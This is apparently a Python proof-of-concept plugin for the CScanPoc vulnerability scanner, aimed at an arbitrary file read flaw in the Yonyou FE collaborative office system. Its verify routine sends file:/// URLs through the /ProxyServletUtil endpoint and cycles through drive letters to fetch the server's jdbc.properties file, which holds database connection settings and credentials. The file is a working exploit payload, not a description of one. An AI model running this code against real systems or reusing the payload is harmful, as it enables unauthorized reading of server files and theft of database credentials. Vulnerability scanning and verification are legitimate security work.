# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'Yonyou_0013'  # 平台漏洞编号，留空
    name = '用友FE协作办公系统 FILE协议文件读取'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.FILE_OPERATION  # 漏洞类型
    disclosure_date = ' 2014-11-07'  # 漏洞公布时间
    desc = '''
        用友是国内著名的内容管理系统之一，包括协同管理系统、用友NC、用友U8等
        用友FE协作办公系统某处协议处理接口未过滤file://协议，导致任意文件读取漏洞,通杀全版本。
    '''  # 漏洞描述
    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=082455'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'Yonyou(用友)'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '7692476d-6890-4d91-b016-aaa1d6e18b45'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-11'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            # Refer http://www.wooyun.org/bugs/wooyun-2010-082455
            hh = hackhttp.hackhttp()
            url = '/ProxyServletUtil?url=file:///'
            code, head, res, errcode, _ = hh.http(self.target + url)
            if code == 500:
                # a-z遍历
                for fuzz in range(0x41, 0x5B):
                    payload = '/ProxyServletUtil?url=file:///' + \
                        chr(
                            fuzz) + ':/FE/jboss/server/default/deploy/fe.war/WEB-INF/classes/jdbc.properties'
                    code, head, res, errcode, _ = hh.http(
                        self.target + payload)
                    # print unichr(fuzz)
                    if code == 200 and 'jdbc' in res:
                        #security_hole('File read vulnerability '+ arg + payload)
                        self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                            target=self.target, name=self.vuln.name))
                        break

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
